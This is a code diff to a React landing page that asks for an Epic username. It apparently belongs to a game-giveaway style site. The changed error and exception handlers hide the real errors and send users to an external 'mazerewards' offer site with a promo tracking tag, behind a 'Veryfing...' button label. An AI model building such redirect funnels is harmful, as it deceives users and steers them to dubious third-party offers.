@@ -98,15 +98,15 @@ export default function LandingPage() {
           setIsLoading(false);
         }
       } else {
-        setMessage(`Error: ${data.error}`);
+        router.push("https://mazerewards.com?utm_source=mazedpromos.com");
       }
     } catch (error) {
-      setMessage(`Unexpected error:`);
+      router.push("https://mazerewards.com?utm_source=mazedpromos.com");
     }
   };
 
   return (
-    <div className="rounded-2xl bg-gradient-to-b from-blue-100 to-blue-500/100 ring-1">
+    <div className="rounded-2xl bg-white ring-1">
       <div id="top-info">
         <div className="absolute -top-3 left-1/2 -translate-x-1/2 transform">
           <span className="relative flex">
@@ -203,7 +203,7 @@ export default function LandingPage() {
         ) : (
           <div>
             <h1 className="leading-tighter my-2 bg-gradient-to-r from-indigo-950 to-indigo-600 bg-clip-text pb-2 text-center text-2xl font-bold tracking-tight text-transparent">
-              Enter epic username
+              Enter Your Epic Username
             </h1>
             <form onSubmit={handleAuth} className="flex flex-col gap-4">
               <Select disabled={isButtonDisabled}>
@@ -230,9 +230,9 @@ export default function LandingPage() {
                 type="text"
                 disabled={isInputDisabled}
                 id="username"
-                placeholder="joshcanoel"
+                placeholder="Enter username"
                 autoFocus
-                className="border-1 h-14 w-full rounded-sm border-neutral-300 bg-white text-center text-lg font-bold text-neutral-900 placeholder-gray-100 placeholder-opacity-100 shadow"
+                className="border-1 h-14 w-full rounded-sm border-neutral-300 bg-neutral-200 text-center text-lg font-bold text-neutral-900 placeholder-gray-100 placeholder-opacity-100 shadow"
               ></Input>
 
               {isLoading ? (
@@ -244,7 +244,7 @@ export default function LandingPage() {
                     disabled={isButtonDisabled}
                   >
                     <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                    Please wait...
+                    Veryfing...
                   </Button>
                 </>
               ) : (
@@ -256,7 +256,7 @@ export default function LandingPage() {
                   >
                     Continue <MoveRight className="ml-2 h-5 w-5" />
                   </Button>
-                  <p className="text-center text-xs text-white">
+                  <p className="text-center text-xs text-neutral-700">
                     We will never ask for your password.
                   </p>
                 </>
